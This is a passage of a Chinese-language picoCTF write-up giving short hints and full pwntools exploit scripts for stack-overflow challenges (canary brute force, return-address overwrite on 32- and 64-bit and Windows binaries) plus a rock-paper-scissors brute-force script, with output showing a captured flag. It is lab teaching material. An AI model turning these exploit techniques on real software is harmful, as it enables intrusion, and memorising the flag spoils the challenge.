<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">58214</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">sla</span><span class="p">(</span><span class="s">' string: </span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x6c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049296</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xCAFEF00D</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xF00DF00D</span><span class="p">))</span>
<span class="n">itr</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="buffer-overflow-3">buffer overflow 3</h2>

<h3 id="思路-4">思路</h3>

<p>canary长度为4，先爆破拿canary，然后再常规栈溢出就行了</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define CANARY_SIZE 4
</span><span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span><span class="n">global_canary</span><span class="p">,</span><span class="n">CANARY_SIZE</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"***** Stack Smashing Detected ***** : Canary Value Corrupt!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> <span class="c1">// crash immediately</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="exp-3">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">63235</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">st_l</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">):</span>
        <span class="n">st_l</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="n">st_l</span><span class="p">)</span> 
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">size</span> <span class="o">=</span> <span class="mh">0x42</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x40</span>

<span class="n">pre_pay</span> <span class="o">=</span> <span class="n">payload</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">st_l</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># test canary
# while True:
#         try:
#                 if argv[1] == 'r':
#                         p = remote('saturn.picoctf.net', 63235)
#                 else:
#                         p = process(binary)
</span>
<span class="c1">#                 # p = process(binary)
#                 # p = remote('saturn.picoctf.net', 57461)
#                 sla('Buffer?\n&gt; ', str(size))
#                 # sa('Input&gt; ', b'b'*0x40+b'cana'+b'AAAA'+p64(0)+p32(0)+p32(0x08049336))
#                 sa('Input&gt; ', payload)
#                 res = rl()
#                 print('res = ', res)
#                 if (str(res).find('Smashing') &gt; 0):
#                         payload = pre_pay
#                         i = (i + 1) % len(st_l)
#                         payload += st_l[i]
#                 else:
#                         print(payload)
#                         size = size + 1
#                         i = 0
#                         pre_pay = payload
#                         payload += st_l[i]
#                         j = j + 1
#                         log.success('size = ' + hex(size))
#                         log.success('pre_pay = ' + str(pre_pay))
#                         log.success('j = ' + str(j))
#                         if (j == 4):
#                                 break
</span>
<span class="c1">#         except Exception as e:
#                 p.close()
</span>

<span class="n">size</span> <span class="o">=</span> <span class="mh">0x60</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbBiRd'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'AAAA'</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x08049336</span><span class="p">)</span>

<span class="n">sla</span><span class="p">(</span><span class="s">'Buffer?</span><span class="se">\n</span><span class="s">&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
<span class="n">sa</span><span class="p">(</span><span class="s">'Input&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
</code></pre></div></div>

<h3 id="result">Result</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
res =  b"Ok... Now Where's the Flag?\n"
b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbBiRd'
[+] size = 0x46
[+] pre_pay = b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbBiRd'
[+] j = 4
...
b'picoCTF{Stat1C_c4n4r13s_4R3_b4D_f7c1f50a}\n'
</code></pre></div></div>

<h2 id="x-sixty-what">x-sixty-what</h2>

<h3 id="思路-5">思路</h3>

<p>换成了x86_64程序，和buffer_overflow_1类似，no canary，直接溢出覆盖返回地址。</p>

<h3 id="exp-4">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">52865</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x40101a</span>
<span class="n">sla</span><span class="p">(</span><span class="s">'gets you the flag: </span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x48</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x40101a</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401236</span><span class="p">))</span>
<span class="n">itr</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="wine">wine</h2>

<h3 id="思路-6">思路</h3>

<p>换成了windows的栈溢出题，no canary</p>

<h3 id="exp-5">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">65422</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x401530</span><span class="p">)</span>
<span class="n">sla</span><span class="p">(</span><span class="s">'Give me a string!</span><span class="se">\r\n</span><span class="s">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
<span class="n">itr</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="cve-xxxx-xxxx">CVE-XXXX-XXXX</h2>

<p>直接google搜Windows Print Spooler Service 2021 CVE，多试几个</p>

<h2 id="rps">RPS</h2>

<h3 id="思路-7">思路</h3>

<p>连续5次猜赢石头剪刀布才会吐flag，用的笨方法爆破，大概10分钟左右。</p>

<h3 id="exp-6">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="c1"># context.log_level = 'debug'
</span><span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">52524</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./game'</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">loses</span> <span class="o">=</span> <span class="p">[</span><span class="s">"paper"</span><span class="p">,</span> <span class="s">"scissors"</span><span class="p">,</span> <span class="s">"rock"</span><span class="p">]</span>
<span class="n">rint</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">rint</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">loses</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>

<span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">i</span> <span class="o">=</span> <span class="n">rint</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>

<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">"Type '1' to play a game"</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">'(rock/paper/scissors):'</span><span class="p">,</span> <span class="n">loses</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">5</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">rint</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
        
        <span class="n">rls</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">rl</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'res = '</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">).</span><span class="n">find</span><span class="p">(</span><span class="s">'You win!'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span>
                <span class="n">count</span> <span class="o">=</span> <span class="n">count</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>

        <span class="k">print</span><span class="p">(</span><span class="n">count</span><span class="p">)</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">5</span><span class="p">):</span>
                <span class="n">ru</span><span class="p">(</span><span class="s">"Congrats, here's the flag!"</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
                <span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
                <span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
                <span class="n">itr</span><span class="p">()</span>
                <span class="k">break</span>
</code></pre></div></div>

<h3 id="result-1">Result</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
res =  b"Seems like you didn't win this time. Play again?\r\n"
0
res =  b'You win! Play again?\r\n'
1
res =  b'You win! Play again?\r\n'
2
res =  b'You win! Play again?\r\n'
3
